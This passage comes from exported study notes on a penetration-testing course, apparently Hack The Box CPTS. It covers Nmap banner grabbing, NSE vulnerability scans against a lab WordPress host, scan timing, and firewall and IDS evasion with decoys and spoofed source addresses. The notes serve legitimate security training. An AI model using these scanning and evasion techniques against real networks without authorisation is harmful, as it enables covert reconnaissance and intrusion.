) at 2020-06-16 20:10 CEST\n<SNIP>\nNSOCK INFO [0.4200s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 18 [10.129.2.28:25] (35 bytes): 220 inlane ESMTP Postfix (Ubuntu)..\nService scan match (Probe NULL matched with NULL line 3104): 10.129.2.28:25 is smtp.  Version: |Postfix smtpd|||\nNSOCK INFO [0.4200s] nsock_iod_delete(): nsock_iod_delete (IOD #1)\nNmap scan report for 10.129.2.28\nHost is up (0.076s latency).\n\nPORT   STATE SERVICE VERSION\n25/tcp open  smtp    Postfix smtpd\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nService Info: Host:  inlane\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 0.47 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-p-`|Scans all ports.|\n|`-sV`|Performs service version detection on specified ports.|\n|`-Pn`|Disables ICMP Echo requests.|\n|`-n`|Disables DNS resolution.|\n|`--disable-arp-ping`|Disables ARP ping.|\n|`--packet-trace`|Shows all packets sent and received.|\n\n---\n\nIf we look at the results from `Nmap`, we can see the port's status, service name, and hostname. Nevertheless, let us look at this line here:\n\n- `NSOCK INFO [0.4200s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 18 [10.129.2.28:25] (35 bytes): 220 inlane ESMTP Postfix (Ubuntu)..`\n\nThen we see that the SMTP server on our target gave us more information than `Nmap` showed us. Because here, we see that it is the Linux distribution `Ubuntu`. It happens because, after a successful three-way handshake, the server often sends a banner for identification. This serves to let the client know which service it is working with. At the network level, this happens with a `PSH` flag in the TCP header. However, it can happen that some services do not immediately provide such information. It is also possible to remove or manipulate the banners from the respective services. If we `manually` connect to the SMTP server using `nc`, grab the banner, and intercept the network traffic using `tcpdump`, we can see what `Nmap` did not show us.\n\n#### Tcpdump\n\nService Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28\n\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\n```\n\n#### Nc\n\nService Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$  nc -nv 10.129.2.28 25\n\nConnection to 10.129.2.28 port 25 [tcp/*] succeeded!\n220 inlane ESMTP Postfix (Ubuntu)\n```\n\n#### Tcpdump - Intercepted Traffic\n\nService Enumeration\n\n```shell-session\n18:28:07.128564 IP 10.10.14.2.59618 > 10.129.2.28.smtp: Flags [S], seq 1798872233, win 65535, options [mss 1460,nop,wscale 6,nop,nop,TS val 331260178 ecr 0,sackOK,eol], length 0\n18:28:07.255151 IP 10.129.2.28.smtp > 10.10.14.2.59618: Flags [S.], seq 1130574379, ack 1798872234, win 65160, options [mss 1460,sackOK,TS val 1800383922 ecr 331260178,nop,wscale 7], length 0\n18:28:07.255281 IP 10.10.14.2.59618 > 10.129.2.28.smtp: Flags [.], ack 1, win 2058, options [nop,nop,TS val 331260304 ecr 1800383922], length 0\n18:28:07.319306 IP 10.129.2.28.smtp > 10.10.14.2.59618: Flags [P.], seq 1:36, ack 1, win 510, options [nop,nop,TS val 1800383985 ecr 331260304], length 35: SMTP: 220 inlane ESMTP Postfix (Ubuntu)\n18:28:07.319426 IP 10.10.14.2.59618 > 10.129.2.28.smtp: Flags [.], ack 36, win 2058, options [nop,nop,TS val 331260368 ecr 1800383985], length 0\n```\n\nThe first three lines show us the three-way handshake.\n\n||||\n|---|---|---|\n|1.|`[SYN]`|`18:28:07.128564 IP 10.10.14.2.59618 > 10.129.2.28.smtp: Flags [S], <SNIP>`|\n|2.|`[SYN-ACK]`|`18:28:07.255151 IP 10.129.2.28.smtp > 10.10.14.2.59618: Flags [S.], <SNIP>`|\n|3.|`[ACK]`|`18:28:07.255281 IP 10.10.14.2.59618 > 10.129.2.28.smtp: Flags [.], <SNIP>`|\n\nAfter that, the target SMTP server sends us a TCP packet with the `PSH` and `ACK` flags, where `PSH` states that the target server is sending data to us and with `ACK` simultaneously informs us that all required data has been sent.\n\n||||\n|---|---|---|\n|4.|`[PSH-ACK]`|`18:28:07.319306 IP 10.129.2.28.smtp > 10.10.14.2.59618: Flags [P.], <SNIP>`|\n\nThe last TCP packet that we sent confirms the receipt of the data with an `ACK`.\n\n||||\n|---|---|---|\n|5.|`[ACK]`|`18:28:07.319426 IP 10.10.14.2.59618 > 10.129.2.28.smtp: Flags [.], <SNIP>`|",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/02_Network Enumeration with Nmap/08-Nmap Scripting Engine",
    "path": "02_CPTS/02_Network Enumeration with Nmap/08-Nmap Scripting Engine.md",
    "title": "08 Nmap Scripting Engine",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Nmap Scripting Engine (NSE) is another handy feature of Nmap. It provides us with the possibility to create scripts in Lua for interaction with certain services. There are a total of 14 categories int...",
    "category": "02_CPTS",
    "content": "Nmap Scripting Engine (`NSE`) is another handy feature of `Nmap`. It provides us with the possibility to create scripts in Lua for interaction with certain services. There are a total of 14 categories into which these scripts can be divided:\n\n|**Category**|**Description**|\n|---|---|\n|`auth`|Determination of authentication credentials.|\n|`broadcast`|Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.|\n|`brute`|Executes scripts that try to log in to the respective service by brute-forcing with credentials.|\n|`default`|Default scripts executed by using the `-sC` option.|\n|`discovery`|Evaluation of accessible services.|\n|`dos`|These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.|\n|`exploit`|This category of scripts tries to exploit known vulnerabilities for the scanned port.|\n|`external`|Scripts that use external services for further processing.|\n|`fuzzer`|This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.|\n|`intrusive`|Intrusive scripts that could negatively affect the target system.|\n|`malware`|Checks if some malware infects the target system.|\n|`safe`|Defensive scripts that do not perform intrusive and destructive access.|\n|`version`|Extension for service detection.|\n|`vuln`|Identification of specific vulnerabilities.|\n\nWe have several ways to define the desired scripts in `Nmap`.\n\n#### Default Scripts\n\nNmap Scripting Engine\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap <target> -sC\n```\n\n#### Specific Scripts Category\n\nNmap Scripting Engine\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap <target> --script <category>\n```\n\n#### Defined Scripts\n\nNmap Scripting Engine\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap <target> --script <script-name>,<script-name>,...\n```\n\nFor example, let us keep working with the target SMTP port and see the results we get with two defined scripts.\n\n#### Nmap - Specifying Scripts\n\nNmap Scripting Engine\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p 25 --script banner,smtp-commands\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 23:21 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.050s latency).\n\nPORT   STATE SERVICE\n25/tcp open  smtp\n|_banner: 220 inlane ESMTP Postfix (Ubuntu)\n|_smtp-commands: inlane, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-p 25`|Scans only the specified port.|\n|`--script banner,smtp-commands`|Uses specified NSE scripts.|\n\nWe see that we can recognize the **Ubuntu** distribution of Linux by using the' banner' script. The `smtp-commands` script shows us which commands we can use by interacting with the target SMTP server. In this example, such information may help us to find out existing users on the target. `Nmap` also gives us the ability to scan our target with the aggressive option (`-A`). This scans the target with multiple options as service detection (`-sV`), OS detection (`-O`), traceroute (`--traceroute`), and with the default NSE scripts (`-sC`).\n\n#### Nmap - Aggressive Scan\n\nNmap Scripting Engine\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p 80 -A\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 01:38 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.012s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-generator: WordPress 5.3.4\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: blog.inlanefreight.com\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), \nAXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), \nLinux 2.6.32 - 2.6.35 (94%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT      ADDRESS\n1   11.91 ms 10.129.2.28\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.36 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-p 80`|Scans only the specified port.|\n|`-A`|Performs service detection, OS detection, traceroute and uses defaults scripts to scan the target.|\n\nWith the help of the used scan option (`-A`), we found out what kind of web server (`Apache 2.4.29`) is running on the system, which web application (`WordPress 5.3.4`) is used, and the title (`blog.inlanefreight.com`) of the web page. Also, `Nmap` shows that it is likely to be `Linux` (`96%`) operating system.\n\n---\n\n## Vulnerability Assessment\n\nNow let us move on to HTTP port 80 and see what information and vulnerabilities we can find using the `vuln` category from `NSE`.\n\n#### Nmap - Vuln Category\n\nNmap Scripting Engine\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p 80 -sV --script vuln \n\nNmap scan report for 10.129.2.28\nHost is up (0.036s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n| http-enum:\n|   /wp-login.php: Possible admin folder\n|   /readme.html: Wordpress version: 2\n|   /: WordPress version: 5.3.4\n|   /wp-includes/images/rss.png: Wordpress version 2.2 found.\n|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.\n|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.\n|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.\n|   /wp-login.php: Wordpress login page.\n|   /wp-admin/upgrade.php: Wordpress login page.\n|_  /readme.html: Interesting, a readme.\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\n| http-wordpress-users:\n| Username found: admin\n|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'\n| vulners:\n|   cpe:/a:apache:http_server:2.4.29:\n|     \tCVE-2019-0211\t7.2\thttps://vulners.com/cve/CVE-2019-0211\n|     \tCVE-2018-1312\t6.8\thttps://vulners.com/cve/CVE-2018-1312\n|     \tCVE-2017-15715\t6.8\thttps://vulners.com/cve/CVE-2017-15715\n<SNIP>\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-p 80`|Scans only the specified port.|\n|`-sV`|Performs service version detection on specified ports.|\n|`--script vuln`|Uses all related scripts from specified category.|\n\nThe scripts used for the last scan interact with the webserver and its web application to find out more information about their versions and check various databases to see if there are known vulnerabilities. More information about NSE scripts and the corresponding categories we can find at: [https://nmap.org/nsedoc/index.html](https://nmap.org/nsedoc/index.html)",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/02_Network Enumeration with Nmap/09-Performance",
    "path": "02_CPTS/02_Network Enumeration with Nmap/09-Performance.md",
    "title": "09 Performance",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Scanning performance plays a significant role when we need to scan an extensive network or are dealing with low network bandwidth. We can use various options to tell Nmap how fast (-T <0-5>), with whi...",
    "category": "02_CPTS",
    "content": "Scanning performance plays a significant role when we need to scan an extensive network or are dealing with low network bandwidth. We can use various options to tell `Nmap` how fast (`-T <0-5>`), with which frequency (`--min-parallelism <number>`), which timeouts (`--max-rtt-timeout <time>`) the test packets should have, how many packets should be sent simultaneously (`--min-rate <number>`), and with the number of retries (`--max-retries <number>`) for the scanned ports the targets should be scanned.\n\n---\n\n## Timeouts\n\nWhen Nmap sends a packet, it takes some time (`Round-Trip-Time` - `RTT`) to receive a response from the scanned port. Generally, `Nmap` starts with a high timeout (`--min-RTT-timeout`) of 100ms. Let us look at an example by scanning the whole network with 256 hosts, including the top 100 ports.\n\n#### Default Scan\n\nPerformance\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.0/24 -F\n\n<SNIP>\nNmap done: 256 IP addresses (10 hosts up) scanned in 39.44 seconds\n```\n\n#### Optimized RTT\n\nPerformance\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms\n\n<SNIP>\nNmap done: 256 IP addresses (8 hosts up) scanned in 12.29 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.0/24`|Scans the specified target network.|\n|`-F`|Scans top 100 ports.|\n|`--initial-rtt-timeout 50ms`|Sets the specified time value as initial RTT timeout.|\n|`--max-rtt-timeout 100ms`|Sets the specified time value as maximum RTT timeout.|\n\nWhen comparing the two scans, we can see that we found two hosts less with the optimized scan, but the scan took only a quarter of the time. From this, we can conclude that setting the initial RTT timeout (`--initial-rtt-timeout`) to too short a time period may cause us to overlook hosts.\n\n---\n\n## Max Retries\n\nAnother way to increase scan speed is by specifying the retry rate of sent packets (`--max-retries`). The default value is `10`, but we can reduce it to `0`. This means if Nmap does not receive a response for a port, it won't send any more packets to that port and will skip it.\n\n#### Default Scan\n\nPerformance\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.0/24 -F | grep \"/tcp\" | wc -l\n\n23\n```\n\n#### Reduced Retries\n\nPerformance\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.0/24 -F --max-retries 0 | grep \"/tcp\" | wc -l\n\n21\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.0/24`|Scans the specified target network.|\n|`-F`|Scans top 100 ports.|\n|`--max-retries 0`|Sets the number of retries that will be performed during the scan.|\n\nAgain, we recognize that accelerating can also have a negative effect on our results, which means we can overlook important information.\n\n---\n\n## Rates\n\nDuring a white-box penetration test, we may get whitelisted for the security systems to check the systems in the network for vulnerabilities and not only test the protection measures. If we know the network bandwidth, we can work with the rate of packets sent, which significantly speeds up our scans with `Nmap`. When setting the minimum rate (`--min-rate <number>`) for sending packets, we tell `Nmap` to simultaneously send the specified number of packets. It will attempt to maintain the rate accordingly.\n\n#### Default Scan\n\nPerformance\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.default\n\n<SNIP>\nNmap done: 256 IP addresses (10 hosts up) scanned in 29.83 seconds\n```\n\n#### Optimized Scan\n\nPerformance\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.minrate300 --min-rate 300\n\n<SNIP>\nNmap done: 256 IP addresses (10 hosts up) scanned in 8.67 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.0/24`|Scans the specified target network.|\n|`-F`|Scans top 100 ports.|\n|`-oN tnet.minrate300`|Saves the results in normal formats, starting the specified file name.|\n|`--min-rate 300`|Sets the minimum number of packets to be sent per second.|\n\n---\n\n#### Default Scan - Found Open Ports\n\nPerformance\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat tnet.default | grep \"/tcp\" | wc -l\n\n23\n```\n\n#### Optimized Scan - Found Open Ports\n\nPerformance\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat tnet.minrate300 | grep \"/tcp\" | wc -l\n\n23\n```\n\n---\n\n## Timing\n\nBecause such settings cannot always be optimized manually, as in a black-box penetration test, `Nmap` offers six different timing templates (`-T <0-5>`) for us to use. These values (`0-5`) determine the aggressiveness of our scans. This can also have negative effects if the scan is too aggressive, and security systems may block us due to the produced network traffic. The default timing template used when we have defined nothing else is the normal (`-T 3`).\n\n- `-T 0` / `-T paranoid`\n- `-T 1` / `-T sneaky`\n- `-T 2` / `-T polite`\n- `-T 3` / `-T normal`\n- `-T 4` / `-T aggressive`\n- `-T 5` / `-T insane`\n\nThese templates contain options that we can also set manually, and have seen some of them already. The developers determined the values set for these templates according to their best results, making it easier for us to adapt our scans to the corresponding network environment. The exact used options with their values we can find here: [https://nmap.org/book/performance-timing-templates.html](https://nmap.org/book/performance-timing-templates.html)\n\n#### Default Scan\n\nPerformance\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.default \n\n<SNIP>\nNmap done: 256 IP addresses (10 hosts up) scanned in 32.44 seconds\n```\n\n#### Insane Scan\n\nPerformance\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.T5 -T 5\n\n<SNIP>\nNmap done: 256 IP addresses (10 hosts up) scanned in 18.07 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.0/24`|Scans the specified target network.|\n|`-F`|Scans top 100 ports.|\n|`-oN tnet.T5`|Saves the results in normal formats, starting the specified file name.|\n|`-T 5`|Specifies the insane timing template.|\n\n---\n\n#### Default Scan - Found Open Ports\n\nPerformance\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat tnet.default | grep \"/tcp\" | wc -l\n\n23\n```\n\n#### Insane Scan - Found Open Ports\n\nPerformance\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat tnet.T5 | grep \"/tcp\" | wc -l\n\n23\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/02_Network Enumeration with Nmap/10 Firewall and IDS & IPS Evasion",
    "path": "02_CPTS/02_Network Enumeration with Nmap/10 Firewall and IDS & IPS Evasion.md",
    "title": "10 Firewall And IDS & IPS Evasion",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Nmap gives us many different ways to bypass firewalls rules and IDS/IPS. These methods include the fragmentation of packets, the use of decoys, and others that we will discuss in this section. --- Fir...",
    "category": "02_CPTS",
    "content": "\n`Nmap` gives us many different ways to bypass firewalls rules and IDS/IPS. These methods include the fragmentation of packets, the use of decoys, and others that we will discuss in this section.\n\n---\n\n## Firewalls\n\nA firewall is a security measure against unauthorized connection attempts from external networks. Every firewall security system is based on a software component that monitors network traffic between the firewall and incoming data connections and decides how to handle the connection based on the rules that have been set. It checks whether individual network packets are being passed, ignored, or blocked. This mechanism is designed to prevent unwanted connections that could be potentially dangerous.\n\n---\n\n## IDS/IPS\n\nLike the firewall, the intrusion detection system (`IDS`) and intrusion prevention system (`IPS`) are also software-based components. `IDS` scans the network for potential attacks, analyzes them, and reports any detected attacks. `IPS` complements `IDS` by taking specific defensive measures if a potential attack should have been detected. The analysis of such attacks is based on pattern matching and signatures. If specific patterns are detected, such as a service detection scan, `IPS` may prevent the pending connection attempts.\n\n---\n\n#### Determine Firewalls and Their Rules\n\nWe already know that when a port is shown as filtered, it can have several reasons. In most cases, firewalls have certain rules set to handle specific connections. The packets can either be `dropped`, or `rejected`. The `dropped` packets are ignored, and no response is returned from the host.\n\nThis is different for `rejected` packets that are returned with an `RST` flag. These packets contain different types of ICMP error codes or contain nothing at all.\n\nSuch errors can be:\n\n- Net Unreachable\n- Net Prohibited\n- Host Unreachable\n- Host Prohibited\n- Port Unreachable\n- Proto Unreachable\n\nNmap's TCP ACK scan (`-sA`) method is much harder to filter for firewalls and IDS/IPS systems than regular SYN (`-sS`) or Connect scans (`sT`) because they only send a TCP packet with only the `ACK` flag. When a port is closed or open, the host must respond with an `RST` flag. Unlike outgoing connections, all connection attempts (with the `SYN` flag) from external networks are usually blocked by firewalls. However, the packets with the `ACK` flag are often passed by the firewall because the firewall cannot determine whether the connection was first established from the external network or the internal network.\n\nIf we look at these scans, we will see how the results differ.\n\n#### SYN-Scan\n\nFirewall and IDS/IPS Evasion\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p 21,22,25 -sS -Pn -n --disable-arp-ping --packet-trace\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 14:56 CEST\nSENT (0.0278s) TCP 10.10.14.2:57347 > 10.129.2.28:22 S ttl=53 id=22412 iplen=44  seq=4092255222 win=1024 <mss 1460>\nSENT (0.0278s) TCP 10.10.14.2:57347 > 10.129.2.28:25 S ttl=50 id=62291 iplen=44  seq=4092255222 win=1024 <mss 1460>\nSENT (0.0278s) TCP 10.10.14.2:57347 > 10.129.2.28:21 S ttl=58 id=38696 iplen=44  seq=4092255222 win=1024 <mss 1460>\nRCVD (0.0329s) ICMP [10.129.2.28 > 10.10.14.2 Port 21 unreachable (type=3/code=3) ] IP [ttl=64 id=40884 iplen=72 ]\nRCVD (0.0341s) TCP 10.129.2.28:22 > 10.10.14.2:57347 SA ttl=64 id=0 iplen=44  seq=1153454414 win=64240 <mss 1460>\nRCVD (1.0386s) TCP 10.129.2.28:22 > 10.10.14.2:57347 SA ttl=64 id=0 iplen=44  seq=1153454414 win=64240 <mss 1460>\nSENT (1.1366s) TCP 10.10.14.2:57348 > 10.129.2.28:25 S ttl=44 id=6796 iplen=44  seq=4092320759 win=1024 <mss 1460>\nNmap scan report for 10.129.2.28\nHost is up (0.0053s latency).\n\nPORT   STATE    SERVICE\n21/tcp filtered ftp\n22/tcp open     ssh\n25/tcp filtered smtp\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.07 seconds\n```\n\n#### ACK-Scan\n\nFirewall and IDS/IPS Evasion\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 14:57 CEST\nSENT (0.0422s) TCP 10.10.14.2:49343 > 10.129.2.28:21 A ttl=49 id=12381 iplen=40  seq=0 win=1024\nSENT (0.0423s) TCP 10.10.14.2:49343 > 10.129.2.28:22 A ttl=41 id=5146 iplen=40  seq=0 win=1024\nSENT (0.0423s) TCP 10.10.14.2:49343 > 10.129.2.28:25 A ttl=49 id=5800 iplen=40  seq=0 win=1024\nRCVD (0.1252s) ICMP [10.129.2.28 > 10.10.14.2 Port 21 unreachable (type=3/code=3) ] IP [ttl=64 id=55628 iplen=68 ]\nRCVD (0.1268s) TCP 10.129.2.28:22 > 10.10.14.2:49343 R ttl=64 id=0 iplen=40  seq=1660784500 win=0\nSENT (1.3837s) TCP 10.10.14.2:49344 > 10.129.2.28:25 A ttl=59 id=21915 iplen=40  seq=0 win=1024\nNmap scan report for 10.129.2.28\nHost is up (0.083s latency).\n\nPORT   STATE      SERVICE\n21/tcp filtered   ftp\n22/tcp unfiltered ssh\n25/tcp filtered   smtp\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.15 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-p 21,22,25`|Scans only the specified ports.|\n|`-sS`|Performs SYN scan on specified ports.|\n|`-sA`|Performs ACK scan on specified ports.|\n|`-Pn`|Disables ICMP Echo requests.|\n|`-n`|Disables DNS resolution.|\n|`--disable-arp-ping`|Disables ARP ping.|\n|`--packet-trace`|Shows all packets sent and received.|\n\nPlease pay attention to the RCVD packets and its set flag we receive from our target. With the SYN scan (`-sS`) our target tries to establish the TCP connection by sending a packet back with the SYN-ACK (`SA`) flags set and with the ACK scan (`-sA`) we get the `RST` flag because TCP port 22 is open. For the TCP port 25, we do not receive any packets back, which indicates that the packets will be dropped.\n\n---\n\n## Detect IDS/IPS\n\nUnlike firewalls and their rules, the detection of IDS/IPS systems is much more difficult because these are passive traffic monitoring systems. `IDS systems` examine all connections between hosts. If the IDS finds packets containing the defined contents or specifications, the administrator is notified and takes appropriate action in the worst case.\n\n`IPS systems` take measures configured by the administrator independently to prevent potential attacks automatically. It is essential to know that IDS and IPS are different applications and that IPS serves as a complement to IDS.\n\nSeveral virtual private servers (`VPS`) with different IP addresses are recommended to determine whether such systems are on the target network during a penetration test. If the administrator detects such a potential attack on the target network, the first step is to block the IP address from which the potential attack comes. As a result, we will no longer be able to access the network using that IP address, and our Internet Service Provider (`ISP`) will be contacted and blocked from all access to the Internet.\n\n- `IDS systems` alone are usually there to help administrators detect potential attacks on their network. They can then decide how to handle such connections. We can trigger certain security measures from an administrator, for example, by aggressively scanning a single port and its service. Based on whether specific security measures are taken, we can detect if the network has some monitoring applications or not.\n    \n- One method to determine whether such `IPS system` is present in the target network is to scan from a single host (`VPS`). If at any time this host is blocked and has no access to the target network, we know that the administrator has taken some security measures. Accordingly, we can continue our penetration test with another `VPS`.\n    \n\nConsequently, we know that we need to be quieter with our scans and, in the best case, disguise all interactions with the target network and its services.\n\n---\n\n## Decoys\n\nThere are cases in which administrators block specific subnets from different regions in principle. This prevents any access to the target network. Another example is when IPS should block us. For this reason, the Decoy scanning method (`-D`) is the right choice. With this method, Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent. With this method, we can generate random (`RND`) a specific number (for example: `5`) of IP addresses separated by a colon (`:`). Our real IP address is then randomly placed between the generated IP addresses. In the next example, our real IP address is therefore placed in the second position. Another critical point is that the decoys must be alive. Otherwise, the service on the target may be unreachable due to SYN-flooding security mechanisms.\n\n#### Scan by Using Decoys\n\nFirewall and IDS/IPS Evasion\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 16:14 CEST\nSENT (0.0378s) TCP 102.52.161.59:59289 > 10.129.2.28:80 S ttl=42 id=29822 iplen=44  seq=3687542010 win=1024 <mss 1460>\nSENT (0.0378s) TCP 10.10.14.2:59289 > 10.129.2.28:80 S ttl=59 id=29822 iplen=44  seq=3687542010 win=1024 <mss 1460>\nSENT (0.0379s) TCP 210.120.38.29:59289 > 10.129.2.28:80 S ttl=37 id=29822 iplen=44  seq=3687542010 win=1024 <mss 1460>\nSENT (0.0379s) TCP 191.6.64.171:59289 > 10.129.2.28:80 S ttl=38 id=29822 iplen=44  seq=3687542010 win=1024 <mss 1460>\nSENT (0.0379s) TCP 184.178.194.209:59289 > 10.129.2.28:80 S ttl=39 id=29822 iplen=44  seq=3687542010 win=1024 <mss 1460>\nSENT (0.0379s) TCP 43.21.121.33:59289 > 10.129.2.28:80 S ttl=55 id=29822 iplen=44  seq=3687542010 win=1024 <mss 1460>\nRCVD (0.1370s) TCP 10.129.2.28:80 > 10.10.14.2:59289 SA ttl=64 id=0 iplen=44  seq=4056111701 win=64240 <mss 1460>\nNmap scan report for 10.129.2.28\nHost is up (0.099s latency).\n\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.15 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-p 80`|Scans only the specified ports.|\n|`-sS`|Performs SYN scan on specified ports.|\n|`-Pn`|Disables ICMP Echo requests.|\n|`-n`|Disables DNS resolution.|\n|`--disable-arp-ping`|Disables ARP ping.|\n|`--packet-trace`|Shows all packets sent and received.|\n|`-D RND:5`|Generates five random IP addresses that indicates the source IP the connection comes from.|\n\nThe spoofed packets are often filtered out by ISPs and routers, even though they come from the same network range. Therefore, we can also specify our VPS servers' IP addresses and use them in combination with \"`IP ID`\" manipulation in the IP headers to scan the target.\n\nAnother scenario would be that only individual subnets would not have access to the server's specific services. So we can also manually specify the source IP address (`-S`) to test if we get better results with this one. Decoys can be used for SYN, ACK, ICMP scans, and OS detection scans. So let us look at such an example and determine which operating system it is most likely to be.\n\n#### Testing Firewall Rule\n\nFirewall and IDS/IPS Evasion\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -n -Pn -p445 -O\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 01:23 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.032s latency).\n\nPORT    STATE    SERVICE\n445/tcp filtered microsoft-ds\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nToo many fingerprints match this host to give specific OS details\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 3.14 seconds\n```\n\n#### Scan by Using Different Source IP\n\nFirewall and IDS/IPS Evasion\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 01:16 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.010s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 